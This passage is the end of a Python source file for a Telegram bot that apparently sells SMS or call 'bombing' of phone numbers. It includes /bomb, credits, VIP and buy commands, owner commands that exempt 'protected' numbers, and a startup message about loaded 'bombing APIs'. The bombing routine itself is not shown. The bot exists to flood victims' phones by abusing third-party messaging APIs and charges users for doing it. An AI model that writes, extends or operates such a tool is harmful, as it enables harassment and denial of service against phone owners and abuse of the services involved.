    await update.message.reply_text(
        e(f"✅ <b>Number Protected!</b>\n\n"
          f"📱 {phone}\n"
          f"🏷️ Label: {label}\n"
          f"🛡️ Anyone who tries to bomb this will get the ultimate disrespect.\n\n"
          f"💀 <b>\"Acha lode baap ko seekhayega\"</b>"),
        parse_mode="HTML"
    )

async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner-only: Remove a protected number"""
    if not await admin_check(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            e("❌ Usage: /unprotect &lt;10-digit number&gt;\n"
              "Example: /unprotect 9876543210\n\n"
              "📱 This number will no longer be shielded."),
            parse_mode="HTML"
        )
        return

    phone = args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(e("❌ Invalid number! Must be exactly 10 digits."), parse_mode="HTML")
        return

    if db.remove_protected_number(phone):
        await update.message.reply_text(
            e(f"✅ <b>Number Unprotected!</b>\n\n"
              f"📱 {phone} is no longer shielded.\n"
              f"🛡️ Protection removed successfully."),
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            e(f"❌ <b>Number not found!</b>\n\n"
              f"📱 {phone} was not in the protected list.\n"
              f"Use /protected to see all protected numbers."),
            parse_mode="HTML"
        )

async def protected_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all protected numbers"""
    if not await admin_check(update):
        return

    numbers = db.get_protected_numbers()
    if not numbers:
        await update.message.reply_text(e("📭 No protected numbers registered."), parse_mode="HTML")
        return

    text = e("🛡️ <b>Protected Numbers</b>\n\n")
    for user_id, phone, label in numbers:
        text += f"📱 {phone} — {label} (User: {user_id})\n"

    await update.message.reply_text(text, parse_mode="HTML")

# ============= MAIN =============

def main():
    """Start the bot"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Please set your BOT_TOKEN in the script!")
        return

    print(f"🚀 Starting {BOT_NAME} {VERSION}...")
    print(f"💣 Loaded {len(ULTIMATE_APIS)} bombing APIs")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"⏰ Free cap: {MAX_DURATION_FREE}s | VIP cap: {MAX_DURATION_VIP}s")
    print(f"🤖 Bot is now running...")
    print(f"💀 Bot by @{BOT_OWNER} | Made by Naruto")

    app = Application.builder().token(BOT_TOKEN).build()

    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("credits", credits_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("refer", refer_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("top", top_command))
    app.add_handler(CommandHandler("help", help_command))

    # Admin commands
    app.add_handler(CommandHandler("addcredits", addcredits_command))
    app.add_handler(CommandHandler("removecredits", removecredits_command))
    app.add_handler(CommandHandler("addvip", addvip_command))
    app.add_handler(CommandHandler("removevip", removevip_command))
    app.add_handler(CommandHandler("giveall", giveall_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("adminstats", adminstats_command))

    # Protected number commands
    app.add_handler(CommandHandler("protect", protect_command))
    app.add_handler(CommandHandler("unprotect", unprotect_command))
    app.add_handler(CommandHandler("protected", protected_list_command))

    # Callbacks
    app.add_handler(CallbackQueryHandler(button_callback))

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()